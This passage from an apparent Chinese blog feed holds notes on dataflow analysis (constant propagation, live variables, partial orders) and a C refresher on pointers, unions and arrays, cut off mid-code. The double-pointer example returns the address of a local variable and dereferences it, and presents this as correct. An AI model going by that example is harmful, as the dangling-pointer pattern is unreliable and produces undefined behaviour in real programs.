one.</em></p>\n<p>​\t文中给出的例子如下：</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310022012864.png\" alt=\"image-20231002201252770\"></p>\n<p>​\t连续传播的过程中使用的内容如下：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// constant propagation</span>\nenter<span class=\"token punctuation\">.</span>after <span class=\"token operator\">=</span> empty set <span class=\"token comment\">// 刚开始是没有任何数据赋值状态的</span>\n<span class=\"token number\">1.</span>before <span class=\"token operator\">=</span> enter<span class=\"token punctuation\">.</span>after <span class=\"token comment\">// 所有的before都是前一个的after</span>\n<span class=\"token number\">1.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">1.</span>before <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">union</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 这里在经历x=2的赋值之后，x不在是任意值，而是2</span>\n<span class=\"token number\">2.</span>before <span class=\"token operator\">=</span> <span class=\"token number\">1.</span>after\n<span class=\"token number\">2.</span>after <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span> is in <span class=\"token number\">2.</span>before then <span class=\"token number\">2.</span>before <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">union</span> <span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2.</span>before <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> \n<span class=\"token comment\">// 算法思想在↑体现，只考虑相邻基本块之间的关系，因此只能分类讨论</span>\n<span class=\"token number\">3.</span>before <span class=\"token operator\">=</span> ⌈⌉<span class=\"token punctuation\">(</span><span class=\"token number\">2.</span>after<span class=\"token punctuation\">,</span> <span class=\"token number\">4.</span>after <span class=\"token punctuation\">)</span> <span class=\"token comment\">// 存在两个前驱结点，所以取∩操作</span>\n<span class=\"token number\">3.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">3.</span>before\n<span class=\"token number\">4.</span>before <span class=\"token operator\">=</span> <span class=\"token number\">3.</span>after\n<span class=\"token number\">4.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">4.</span>before<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310022014784.png\" alt=\"image-20231002201421727\"></p>\n<p>这里的分析时must分析，因此要使用到solution 4，尽可能多的结果。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">//  live-variable analysis</span>\n<span class=\"token comment\">// 这个从最后一行开始看比较好</span>\nenter<span class=\"token punctuation\">.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">1.</span>before \n<span class=\"token number\">1.</span>before <span class=\"token operator\">=</span> <span class=\"token number\">1.</span>after <span class=\"token operator\">-</span> <span class=\"token punctuation\">{</span>x<span class=\"token punctuation\">}</span> <span class=\"token comment\">// x的声明位置因此要union上x</span>\n<span class=\"token number\">1.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">2.</span>before\n<span class=\"token number\">2.</span>before <span class=\"token operator\">=</span> <span class=\"token number\">2.</span>after <span class=\"token operator\">-</span> <span class=\"token punctuation\">{</span>y<span class=\"token punctuation\">}</span> <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>x<span class=\"token punctuation\">}</span> <span class=\"token comment\">// y的声明位置，所以要减去y，同时是x的使用位置要union上x</span>\n<span class=\"token number\">2.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">3.</span>before\n<span class=\"token number\">3.</span>before <span class=\"token operator\">=</span> <span class=\"token number\">3.</span>after\n<span class=\"token number\">3.</span>after <span class=\"token operator\">=</span> exit<span class=\"token punctuation\">.</span>before ⌈⌉ <span class=\"token number\">4.</span>before\n<span class=\"token number\">4.</span>before <span class=\"token operator\">=</span> <span class=\"token number\">4.</span>after <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>y<span class=\"token punctuation\">}</span> <span class=\"token comment\">// 4之后不知道，但是由于4出现了y的使用，因此要将y并入</span>\n<span class=\"token number\">4.</span>after <span class=\"token operator\">=</span> <span class=\"token number\">3.</span>before \nexit<span class=\"token punctuation\">.</span>before <span class=\"token operator\">=</span> empty<span class=\"token operator\">-</span>set  <span class=\"token comment\">// 最终结束后都是empty set</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310022014760.png\" alt=\"image-20231002201431716\"></p>\n<p>这里的variable live是may模式，因此要采用的最好是least的结果。</p>\n<h3 id=\"数据流分析的格点模型\"><a href=\"#数据流分析的格点模型\" class=\"headerlink\" title=\"数据流分析的格点模型\"></a>数据流分析的格点模型</h3><p>MOP模型存在以下问题：</p>\n<ul>\n<li>我们怎么知道方程的解存在?</li>\n<li>如果有不止一个解，我们想要哪一个?</li>\n<li>方程解与MOP解有什么关系?</li>\n</ul>\n<h4 id=\"Partially-ordered-sets-偏序集\"><a href=\"#Partially-ordered-sets-偏序集\" class=\"headerlink\" title=\"Partially ordered sets 偏序集\"></a>Partially ordered sets 偏序集</h4><p>​\t设R是集合A上的一个关系，如果R是自反的、反对称的和可传递的，则称R是集合A的偏序关系，简称偏序，记作“≤”。对于（a，b）∈R，就把它表示成a≤b。</p>\n<p>​\t若在集合A上给定一个偏序关系≤，则称集合A按偏序关系≤构成一个偏序集合，集合A和偏序R一起称为偏序集，记作（A，≤）（取自百度百科）</p>\n<p>偏序关系存在以下性质：</p>\n<p>（1）自反性：a≤a，∀a∈P；</p>\n<p>（2）反对称性：∀a，b∈P，若a≤b且b≤a，则a=b；</p>\n<p>（3）传递性：∀a，b，c∈P，若a≤b且b≤c，则a≤c；</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYWdlcy5jcy53aXNjLmVkdS9+aG9yd2l0ei9DUzcwNC1OT1RFUy8yLkRBVEFGTE9XLmh0bWw=\">https://pages.cs.wisc.edu/~horwitz/CS704-NOTES/2.DATAFLOW.html</span></p>\n",
            "tags": [
                "dataflow"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/11/speedrunner-for-c/",
            "url": "https://alazymechnaic.github.io/2023/09/11/speedrunner-for-c/",
            "title": "SpeedRunner_for_C",
            "date_published": "2023-09-11T11:24:57.000Z",
            "content_html": "<h2 id=\"SpeedRunner-for-C\"><a href=\"#SpeedRunner-for-C\" class=\"headerlink\" title=\"SpeedRunner_for_C\"></a>SpeedRunner_for_C</h2><hr>\n<p>​\t本文用于帮助常年不使用C语言的程序员进行复健。</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309111927899.png\" alt=\"image-20230911192658774\"></p>\n<p>图片来源：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYVNpVk5YSjByS0JXTHlfTWx6T01XQQ==\">https://mp.weixin.qq.com/s/aSiVNXJ0rKBWLy_MlzOMWA</span></p>\n<p>直接上例子，哪里不会读哪里</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token comment\">// 定义结构体</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 函数声明</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">printPerson</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">Person</span><span class=\"token operator\">*</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 声明并初始化数组</span>\n    <span class=\"token keyword\">int</span> numbers<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 数组遍历</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>numbers<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>numbers<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> numbers<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 声明并初始化指针</span>\n    <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> ptr <span class=\"token operator\">=</span> numbers<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 使用指针访问数组元素</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>numbers<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>numbers<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>ptr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 定义结构体变量</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Person</span> person1<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>person1<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    person1<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">25</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 调用函数打印结构体内容</span>\n    <span class=\"token function\">printPerson</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>person1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 函数定义</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">printPerson</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">Person</span><span class=\"token operator\">*</span> p<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Name: %s\\n\"</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-&gt;</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Age: %d\\n\"</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-&gt;</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"值传递方式\"><a href=\"#值传递方式\" class=\"headerlink\" title=\"值传递方式\"></a>值传递方式</h2><p>​\t在C语言中，指针可以通过值传递或引用传递的方式进行函数参数的传递。下面给出了两种指针传参的示例代码：</p>\n<ol>\n<li><p>值传递方式：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">changeValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    num <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 修改局部变量的值</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> num <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Before: %d\\n\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">changeValue</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 值传递</span>\n    \n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After: %d\\n\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// num的值未改变</span>\n    \n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>​\t在这个示例中，<code>changeValue</code>函数通过值传递方式接收一个<code>int</code>类型的参数<code>num</code>。在函数内部，对<code>num</code>进行修改，但这只会影响到函数内部的局部变量，不会改变<code>main</code>函数中的<code>num</code>的值。因此，输出结果为<code>Before: 5</code>和<code>After: 5</code>。</p>\n</li>\n<li><p>引用传递方式：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">changeValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> ptr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token operator\">*</span>ptr <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 修改指针所指向的变量的值</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> num <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Before: %d\\n\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">changeValue</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 引用传递</span>\n    \n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After: %d\\n\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// num的值已被修改</span>\n    \n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>​\t在这个示例中，<code>changeValue</code>函数通过引用传递方式接收一个指向<code>int</code>类型的指针<code>ptr</code>。在函数内部，通过解引用操作<code>*ptr</code>修改了指针所指向的变量的值，因为传递的是指针的地址。这样就可以在函数内部修改<code>main</code>函数中的<code>num</code>的值。输出结果为<code>Before: 5</code>和<code>After: 10</code>。</p>\n</li>\n</ol>\n<p>​\t通过这两个示例，可以看到值传递方式只是传递了变量的副本，函数对副本的修改不会影响原始变量。而引用传递方式通过传递指针的地址，可以直接修改原始变量的值。在实际应用中，可以根据需要选择合适的传参方式。</p>\n<p>​\t<strong>上述内容有一个易错点，就是int*p作为changeValue的参数，指的是传入的ptr是一个地址类型，而调用使用&amp;恰好是取出一个地址进行操作。在做类型定义和类型使用时对于指针的用法是不一样的。</strong></p>\n<ol start=\"3\">\n<li>双重指针的传递方式</li>\n</ol>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> ptr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 这里定义传入的指针是指向指针地址的类型</span>\n    <span class=\"token keyword\">int</span> value <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> \n    <span class=\"token operator\">*</span>ptr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>value<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将指针指向局部变量value的地址</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> p <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将p的地址传递给函数</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Value: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 解引用p获取值</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"Union类型的使用\"><a href=\"#Union类型的使用\" class=\"headerlink\" title=\"Union类型的使用\"></a>Union类型的使用</h2><p>​\t在C语言中，联合（Union）是一种特殊的数据结构，<strong>它允许在相同的内存位置存储不同的数据类型。只能同时存储联合中所定义的一个成员的值，如果多个成员的内存大小不相同，则按照尺寸最大的那个变量申请内存</strong>。下面是一个具体的例子，展示了如何使用联合：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h&gt;</span></span>\n\n<span class=\"token comment\">// 定义联合</span>\n<span class=\"token keyword\">union</span> Data <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> intValue<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">float</span> floatValue<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> stringValue<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">union</span> Data data<span class=\"token punctuation\">;</span>\n  \n    <span class=\"token comment\">// 设置整数值</span>\n    data<span class=\"token punctuation\">.</span>intValue <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Integer value: %d\\n\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>intValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n    <span class=\"token comment\">// 设置浮点数值</span>\n    data<span class=\"token punctuation\">.</span>floatValue <span class=\"token operator\">=</span> <span class=\"token number\">3.14</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Float value: %.2f\\n\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>floatValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n    <span class=\"token comment\">// 设置字符串值</span>\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>stringValue<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"String value: %s\\n\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>stringValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n    <span class=\"token comment\">// 访问共用体的值</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After setting string value, Integer value: %d\\n\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>intValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After setting string value, Float value: %.2f\\n\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>floatValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​\t在这个例子中，我们定义了一个联合<code>Data</code>，包含三个成员：<code>intValue</code>（整数类型）、<code>floatValue</code>（浮点数类型）和<code>stringValue</code>（字符串类型）。</p>\n<p>​\t在<code>main</code>函数中，我们声明了一个<code>data</code>联合变量。我们可以通过给联合的不同成员赋值来存储不同类型的数据。在示例中，我们首先设置<code>intValue</code>为10，然后打印出整数值。接下来，我们将<code>floatValue</code>设置为3.14，并打印出浮点数值。最后，我们使用<code>strcpy</code>函数将字符串”Hello”复制到<code>stringValue</code>成员中，并打印出字符串值。</p>\n<p>​\t需要注意的是，联合只能同时存储一个成员的值，因此在设置一个成员的值后，其他成员的值将被覆盖。在示例的最后，我们访问整数值和浮点数值，并发现在设置字符串值后，这两个值被改变了。</p>\n<p>​\t联合在某些情况下可以用于节省内存空间，因为它们共享相同的内存位置。但是要注意使用联合时要小心，确保正确地访问和解释存储在联合中的数据。</p>\n<h2 id=\"二维数组的使用\"><a href=\"#二维数组的使用\" class=\"headerlink\" title=\"二维数组的使用\"></a>二维数组的使用</h2><p>在C语言中，可以使用多种方法创建二维数组。下面是两种常见的创建二维数组的方法：</p>\n<p><strong>方法一：使用静态初始化创建二维数组</strong></p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 创建一个2行3列的二维数组</span>\n    <span class=\"token keyword\">int</span> matrix<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 第一行的元素</span>\n        <span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">}</span>    <span class=\"token comment\">// 第二行的元素</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 访问二维数组的元素</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Element at matrix[0][0]: %d\\n\"</span><span class=\"token punctuation\">,</span> matrix<span class=\"token punctuation\">[</span><span class=\"token 